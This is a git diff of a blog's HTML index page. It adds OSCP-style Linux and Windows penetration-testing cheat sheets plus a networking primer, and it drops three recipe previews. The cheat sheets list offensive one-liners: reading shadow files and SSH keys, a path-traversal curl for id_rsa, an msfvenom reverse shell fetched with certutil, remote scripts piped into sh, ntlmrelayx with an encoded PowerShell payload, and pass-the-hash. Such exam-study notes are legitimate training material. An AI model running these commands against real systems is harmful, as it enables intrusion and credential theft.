@@ -179,6 +179,241 @@
     
       <article class="post on-list">
         <h2 class="post-title">
+          <a href="/posts/cheat-sheet---oscp-linux/">Cheat Sheet - Linux</a>
+        </h2>
+        <div class="post-meta"></div>
+
+        
+          <span class="post-tags">
+            
+            #<a href="/tags/cyber-security/">cyber-security</a>&nbsp;
+            
+            #<a href="/tags/oscp/">oscp</a>&nbsp;
+            
+          </span>
+        
+
+        
+
+
+        <div class="post-content">
+          
+            <hr>
+<h1 id="initial-access">Initial Access</h1>
+<p>Launch Netcat Listener: <code>nc -nvlp 1234</code>
+Launch HTML server: `python3 -m http.server 80
+Launch Python Virtual Environment:</p>
+<ul>
+<li><code>cd ~/py</code></li>
+<li>`python3 -m venv venv</li>
+<li><code>source bin/activate Run enum4linux-ng: </code>enum4linux-ng -A 192.168.x.x<code>Run enum4linux:</code>enum4linux 192.168.x.x` (Run both tools)</li>
+</ul>
+<h1 id="privesc">PrivEsc</h1>
+<h2 id="upgrade-shell">Upgrade Shell</h2>
+<ul>
+<li>`/usr/bin/script -qc /bin/bash /dev/null</li>
+<li>`python3 -c &lsquo;import pty; pty.spawn(&quot;/bin/bash&quot;)&rsquo;</li>
+<li>`python3 -c &ldquo;import pty; pty.spawn(&rsquo;/bin/sh&rsquo;)&rdquo;</li>
+<li><code>/bin/sh -i</code> | <code>/bin/bash -i</code> | <code>echo 'os.system('/bin/bash')'</code></li>
+<li><code>perl -e 'exec &quot;/bin/sh&quot;;'</code></li>
+<li>To escape rbash
+<ul>
+<li><code>ssh user@ip -t &quot;bash --noprofile&quot;</code></li>
+<li><code>export PATH=$PATH:/usr/local/sbin:/usr/localsbin:/usr/sbin:/usr/bin:/sbin:/bin</code></li>
+</ul>
+</li>
+</ul>
+<h2 id="enumerate">Enumerate</h2>
+<ul>
+<li><code>find / -name local.txt -type f 2&gt;/dev/null</code></li>
+<li><code>id</code></li>
+<li><code>cat /etc/passwd</code> | <code>cat /etc/shadow</code> | <code>cat /root/.ssh</code></li>
+<li><code>hostname</code>, <code>cat /etc/issue</code>,<code>cat /etc/os-release</code>, <code>uname -a</code></li>
+<li><code>/home/andrew/.bash_history</code></li>
+<li><code>sudo -l</code> &ndash;&gt; check <a href="https://gtfobins.github.io/">GTFOBins</a></li>
+<li><code>crontab -l</code></li>
+<li><code>su root:root</code>, <code>su andrew:andrew</code>, <code>su andrew:(NOPASS)</code>, <code>sudo -i</code> (reqs root password)</li>
+<li><code>ls /var/mail</code> | <code>ls /var/spool/mail</code></li>
+<li><code>/usr/sbin/getcap -r / 2&gt;/dev/null</code></li>
+<li><a href="https://vk9-sec.com/disk-group-privilege-escalation/?source=post_page-----9aaa071b5989--------------------------------">If member of Disk Group</a>
+<ul>
+<li><code>df -h</code> (find OS) | <code>debugfs /dva/OS</code> | <code>/etc/shadow</code> <code>/root/.ssh</code></li>
+</ul>
+</li>
+<li>Binaries
+<ul>
+<li><code>find / -perm -4000 2&gt;/dev/null</code></li>
+<li><code>find / -perm -u=s -type f 2&gt;/dev/null -printf &quot;%f\n&quot;</code>
+<ul>
+<li><code>ls -lah</code> &amp; check <a href="https://gtfobins.github.io/">GTFObins</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Processes:
+<ul>
+<li><code>ps -eaf</code></li>
+<li>Watch processes:<code>watch -n 1 &quot;ps -aux | grep pass&quot;</code></li>
+<li>Pspy: <a href="https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32">https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32</a>
+<ul>
+<li><code>wget $kaliIP/pspy32</code></li>
+<li><code>chmod +x pspy32</code> &amp; <code>timeout 2m ./pspy32</code></li>
+</ul>
+</li>
+<li>If root is regularly running a writable script: <code>echo &quot;chmod +s /bin/bash&quot; &gt;&gt; script.sh</code> then <code>/bin/bash -p</code></li>
+</ul>
+</li>
+<li>Enumeration Scripts:
+<ul>
+<li><a href="https://github.com/etc5had0w/suider/blob/main/suider.sh">SUIDer</a>: <code>wget -L https://github.com/etc5had0w/suider/blob/main/suider.sh</code></li>
+<li><a href="https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS">LinPeas</a>: <code>curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh</code></li>
+<li><a href="https://github.com/rebootuser/LinEnum">LinEnum</a></li>
+<li>Kali Pre-installed <code>unix-privesc-check</code></li>
+<li><a href="https://github.com/mzet-/linux-exploit-suggester">Linux Exploit Suggester</a> <code>https://github.com/The-Z-Labs/linux-exploit-suggester/blob/master/linux-exploit-suggester.sh</code></li>
+<li><a href="https://github.com/diego-treitos/linux-smart-enumeration">Linux Smart Enumeration</a> <code>wget https://github.com/diego-treitos/linux-smart-enumeration/blob/master/lse.sh</code></li>
+</ul>
+</li>
+</ul>
+<h2 id="exploit">Exploit</h2>
+<ul>
+<li>RSA key on Linux server: <code>curl http://192.168.XX.XXX/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/home/username/.ssh/id_rsa</code></li>
+</ul>
+<h1 id="random---to-sort">Random - To Sort</h1>
+<ul>
+<li>
+<p><code>exiftool -a -u file.pdf</code> (metadata inspector)</p>
+          
+        </div>
+
+        
+           <div>
+            <a class="read-more button inline" href="/posts/cheat-sheet---oscp-linux/">[Read more]</a>
+          </div>
+        
+      </article>
+    
+      <article class="post on-list">
+        <h2 class="post-title">
+          <a href="/posts/cheat-sheet---networking/">Cheat Sheet - Networking</a>
+        </h2>
+        <div class="post-meta"></div>
+
+        
+          <span class="post-tags">
+            
+            #<a href="/tags/tag1/">tag1</a>&nbsp;
+            
+          </span>
+        
+
+        
+
+
+        <div class="post-content">
+          
+            <hr>
+<p><strong>Network security</strong> is the practices and policies used to protect and monitor a computer network’s resources against threats and risks.</p>
+<p><strong>Client-server model</strong> is a network computing model that defines how resources and services are shared across a network. Uses a <strong><!-- raw HTML omitted -->“request and response”<!-- raw HTML omitted --></strong> method of device communication.</p>
+<p><strong>Network threats and risks</strong></p>
+<ul>
+<li>Unauthorized access into networks</li>
+<li>Denial of service (DoS) attacks</li>
+<li>Eavesdropping</li>
+<li>Data modification (eg attacker steals your data &amp; modifies without your knowledge)</li>
+</ul>
+<p><strong>Local Area Network (LAN)</strong> is a private computer network that connects devices in smaller physical areas like a room or single building, such as a small office or home network.</p>
+          
+        </div>
+
+        
+           <div>
+            <a class="read-more button inline" href="/posts/cheat-sheet---networking/">[Read more]</a>
+          </div>
+        
+      </article>
+    
+      <article class="post on-list">
+        <h2 class="post-title">
+          <a href="/posts/oscp---cheat-sheet---windows/">Cheat Sheet - OSCP Windows</a>
+        </h2>
+        <div class="post-meta"></div>
+
+        
+          <span class="post-tags">
+            
+            #<a href="/tags/cyber-security/">cyber-security</a>&nbsp;
+            
+            #<a href="/tags/oscp/">oscp</a>&nbsp;
+            
+          </span>
+        
+
+        
+
+
+        <div class="post-content">
+          
+            <p>Related:
+Tags: <a href="/posts/oscp/">OSCP</a></p>
+<hr>
+<h2 id="quick-reference">Quick Reference</h2>
+<ul>
+<li><code>dir /s/b local.txt</code> - Usually <code>C:\</code> or <code>C:\users\username\desktop\</code></li>
+<li><code>dir /s/b proof.txt</code> - Usually <code>C:\Users\Administrator\Desktop\</code></li>
+<li><code>dir /s/b *.txt</code></li>
+<li>RDP: <code>xfreerdp /u:username /p:password /v:192.168.x.x /cert:ignore</code></li>
+<li>RevShell.exe: <code>msfvenom -p windows/shell_reverse_tcp LHOST=192.168. LPORT=4444 -f exe -o revshell.exe</code></li>
+<li>Compile C: <code>/usr/bin/x86_64-w64-mingw32-gcc cfile.c -o output.exe</code></li>
+<li>Compile C#: <code>msbuild projectname.csproj</code></li>
+<li>Transfer to Windows host: <code>certutil -split -urlcache -f http://192.168.x.x/revshell.exe C:\\Users\\username\\revshell.exe</code></li>
+<li>Fix Broken Path: <code>set PATH=%PATH%C:\Windows\System32;C:\Windows\System32\WindowsPowerShell\v1.0;</code></li>
+<li>Windows Exploit Suggester: <a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester">https://github.com/AonCyberLabs/Windows-Exploit-Suggester</a></li>
+</ul>
+<h2 id="port-enumeration-from-kali">Port Enumeration (from Kali)</h2>
+<ul>
+<li><strong>HTTP/WebDav (80)</strong>: <code>cadaver 192.168.</code>
+<ul>
+<li>Run <code>put /usr/share/webshells/aspx/cmdasp.aspx</code> to upload command shell, then access via browser</li>
+</ul>
+</li>
+<li><strong>Kerberos (88)</strong>: <code>kerbrute userenum -d domain.name --dc 192.168. users</code></li>
+<li><strong>SMB (139/445)</strong>: <code>sudo nmap --script smb-vuln* -p 139,445 192.168.</code>
+<ul>
+<li><code>smbclient -U user \\\\192.168.</code></li>
+<li><code>impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.xx.xxx -c &quot;powershell -enc JABjAGwAaQBlAG4AdA...&quot;</code> (base64 powershell one-liner)
+<ul>
+<li>Kali: Call fake directory <code>dir \\192.168.xx.xxx\fake</code> for reverse shell</li>
+</ul>
+</li>
+<li>Pass the Hash: <code>smbclient \\\\192.168.xx.xxx\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b</code></li>
+</ul>
+</li>
+<li><strong>LDAP (389)</strong>: <code>sudo nmap -n -sV -Pn -script 'ldap* and not brute' 192.168.</code>
+<ul>
+<li>Domain Name found (LDAP Search): <code>ldapsearch -v -x -b 'DC=domain,DC=name' -H 'ldap://192.168.' '(objectclass=*)'</code></li>
+<li>Use credentials to find admin password <code>ldapsearch -x -H 'ldap://192.168.x.x' -D 'domain\user' -w 'userpassword' -b 'dc=domain,dc=name' &quot;(ms-MCS-AdmPwd=*)&quot; ms-MCS-AdmPwd</code>
+<ul>
+<li>To Login <code>psexec.py domain.name/administrator: 'adminpassword'@192.168.x.x</code> to login</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="impacket">Impacket</h2>
+<p>Psexec.py - <code>/usr/share/doc/python3-impacket/examples/psexec.py</code>
+<code>impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.xx.xxx</code></p>
+          
+        </div>
+
+        
+           <div>
+            <a class="read-more button inline" href="/posts/oscp---cheat-sheet---windows/">[Read more]</a>
+          </div>
+        
+      </article>
+    
+      <article class="post on-list">
+        <h2 class="post-title">
           <a href="/posts/cheat-sheet---linux/">Cheatsheet - Linux</a>
         </h2>
         <div class="post-meta"></div>
@@ -406,245 +641,6 @@
         
            <div>
             <a class="read-more button inline" href="/posts/cheat-sheet---windows/">[Read more]</a>
-          </div>
-        
-      </article>
-    
-      <article class="post on-list">
-        <h2 class="post-title">
-          <a href="/posts/meal---cheese-pull-apart-bread/">Cheese Pull Apart Bread</a>
-        </h2>
-        <div class="post-meta"></div>
-
-        
-          <span class="post-tags">
-            
-            #<a href="/tags/meal/">meal</a>&nbsp;
-            
-            #<a href="/tags/snack/">snack</a>&nbsp;
-            
-            #<a href="/tags/bread/">bread</a>&nbsp;
-            
-            #<a href="/tags/cheese/">cheese</a>&nbsp;
-            
-            #<a href="/tags/oven/">oven</a>&nbsp;
-            
-            #<a href="/tags/indulgent/">indulgent</a>&nbsp;
-            
-          </span>
-        
-
-        
-
-
-        <div class="post-content">
-          
-            <hr>
-<h1 id="ingredients">Ingredients</h1>
-<ul>
-<li>Bread loaf (sourdough or cob) - 1</li>
-<li>Mozzarella - 200g (cubed or shredded)</li>
-<li>Butter - 3 tbsp (melted)</li>
-<li>Garlic - 2 cloves (minced)</li>
-<li>Parsley (optional)</li>
-<li>Seasoning
-<ul>
-<li>Salt</li>
-<li>Pepper</li>
-</ul>
-</li>
-</ul>
-<h1 id="directions">Directions</h1>
-<ol>
-<li>Cut the bread in a crosshatch pattern (do not slice all the way through)</li>
-<li>Stuff mozzarella into the cuts throughout the loaf</li>
-<li>Mix melted butter with garlic and seasoning</li>
-<li>Pour or brush mixture over the bread, ensuring it gets into the gaps</li>
-<li>Wrap loosely in foil and bake at 180°C for 15 minutes</li>
-<li>Uncover and bake another 5–10 minutes until crispy and melted</li>
-<li>Serve immediately and pull apart</li>
-</ol>
-<h1 id="macros">Macros</h1>
-<ul>
-<li>Calories - 420</li>
-<li>Protein - 14g</li>
-<li>Carbs - 38g</li>
-<li>Fat - 24g</li>
-</ul>
-<h1 id="notes">Notes</h1>
-<ul>
-<li>Identified based on “cheese pull” style construction</li>
-<li>Designed for visual melt/stretch rather than high-protein efficiency</li>
-<li>Best served immediately while cheese is hot and elastic</li>
-</ul>
-          
-        </div>
-
-        
-           <div>
-            <a class="read-more button inline" href="/posts/meal---cheese-pull-apart-bread/">[Read more]</a>
-          </div>
-        
-      </article>
-    
-      <article class="post on-list">
-        <h2 class="post-title">
-          <a href="/posts/meal---cheeseburger-bowls/">Cheeseburger Bowls</a>
-        </h2>
-        <div class="post-meta"></div>
-
-        
-          <span class="post-tags">
-            
-            #<a href="/tags/meal/">meal</a>&nbsp;
-            
-            #<a href="/tags/beef/">beef</a>&nbsp;
-            
-            #<a href="/tags/bowl/">bowl</a>&nbsp;
-            
-            #<a href="/tags/burger/">burger</a>&nbsp;
-            
-            #<a href="/tags/high-protein/">high-protein</a>&nbsp;
-            
-            #<a href="/tags/meal-prep/">meal-prep</a>&nbsp;
-            
-            #<a href="/tags/to-try/">to-try</a>&nbsp;
-            
-          </span>
-        
-
-        
-
-
-        <div class="post-content">
-          
-            <hr>
-<h1 id="ingredients">Ingredients</h1>
-<ul>
-<li>Ground beef - 500g</li>
-<li>Potatoes (or fries) - 400g</li>
-<li>Cheese - 1 cup (shredded)</li>
-<li>Pickles - to taste</li>
-<li>Lettuce - 1–2 cups (shredded)</li>
-<li>Onion - 1/2 (diced)</li>
-</ul>
-<h2 id="burger-sauce">Burger Sauce</h2>
-<ul>
-<li>Mayonnaise - 3 tbsp</li>
-<li>Ketchup - 1 tbsp</li>
-<li>Mustard - 1 tsp</li>
-<li>Pickle juice - 1 tsp</li>
-</ul>
-<h1 id="directions">Directions</h1>
-<ol>
-<li>Cook potatoes or fries until crispy</li>
-<li>Cook ground beef with salt and pepper until browned</li>
-<li>Mix burger sauce ingredients in a bowl</li>
-<li>Assemble bowls with potatoes, beef, cheese, lettuce, onion, and pickles</li>
-<li>Drizzle with burger sauce and serve</li>
-</ol>
-<h1 id="macros">Macros</h1>
-<ul>
-<li>Calories - 520</li>
-<li>Protein - 40g</li>
-<li>Carbs - 35g</li>
-<li>Fat - 22g</li>
-</ul>
-<h1 id="notes">Notes</h1>
-<ul>
-<li>Identified as cheeseburger-style bowl based on user verification</li>
-<li>Typical “burger in a bowl” structure (beef + potato base + sauce)</li>
-</ul>
-          
-        </div>
-
-        
-           <div>
-            <a class="read-more button inline" href="/posts/meal---cheeseburger-bowls/">[Read more]</a>
-          </div>
-        
-      </article>
-    
-      <article class="post on-list">
-        <h2 class="post-title">
-          <a href="/posts/meal---chicken--chorizo-one-pan-rice/">Chicken &amp; Chorizo One Pan Rice</a>
-        </h2>
-        <div class="post-meta"></div>
-
-        
-          <span class="post-tags">
-            
-            #<a href="/tags/meal/">meal</a>&nbsp;
-            
-            #<a href="/tags/chicken/">chicken</a>&nbsp;
-            
-            #<a href="/tags/chorizo/">chorizo</a>&nbsp;
-            
-            #<a href="/tags/rice/">rice</a>&nbsp;
-            
-            #<a href="/tags/one-pan/">one-pan</a>&nbsp;
-            
-            #<a href="/tags/high-protein/">high-protein</a>&nbsp;
-            
-          </span>
-        
-
-        
-
-
-        <div class="post-content">
-          
-            <hr>
-<h1 id="ingredients">Ingredients</h1>
-<ul>
-<li>Chicken breast - 600g (diced)</li>
-<li>Chorizo - 120–150g (sliced)</li>
-<li>Rice - 250–300g (uncooked, rinsed)</li>
-<li>Onion - 1 (diced)</li>
-<li>Red and yellow peppers - 2 (chopped)</li>
-<li>Garlic - 3 cloves (minced)</li>
-<li>Chicken stock - 500–700ml</li>
-<li>Tomato paste - 2 tbsp</li>
-<li>Oil - 1 tbsp</li>
-</ul>
-<h1 id="seasoning">Seasoning</h1>
-<ul>
-<li>Smoked paprika - 2 tsp</li>
-<li>Garlic powder - 1 tsp</li>
-<li>Salt</li>
-<li>Pepper</li>
-<li>Chilli (optional)</li>
-</ul>
-<h1 id="directions">Directions</h1>
-<ol>
-<li>Heat oil in a large pan and cook chorizo until it releases oils</li>
-<li>Add onion, peppers, and garlic, cooking until softened</li>
-<li>Add chicken and cook until browned</li>
-<li>Stir in tomato paste and seasoning</li>
-<li>Add rice and mix to coat in flavours</li>
-<li>Pour in chicken stock and bring to a simmer</li>
-<li>Cover and cook for 15–20 minutes until rice is tender and liquid absorbed</li>
-<li>Fluff and serve</li>
-</ol>
-<h1 id="macros">Macros</h1>
-<ul>
-<li>Calories - 600</li>
-<li>Protein - 45g</li>
-<li>Carbs - 60g</li>
-<li>Fat - 18g</li>
-</ul>
-<h1 id="notes">Notes</h1>
-<ul>
-<li>Confirmed from indexed reel + multiple matching recipes :contentReference[oaicite:4]{index=4}</li>
-<li>Similar to simplified paella-style cooking (one-pan absorption method)</li>
-<li>Very strong meal prep option</li>
-</ul>
-          
-        </div>
-
-        
-           <div>
-            <a class="read-more button inline" href="/posts/meal---chicken--chorizo-one-pan-rice/">[Read more]</a>
           </div>
         
       </article>
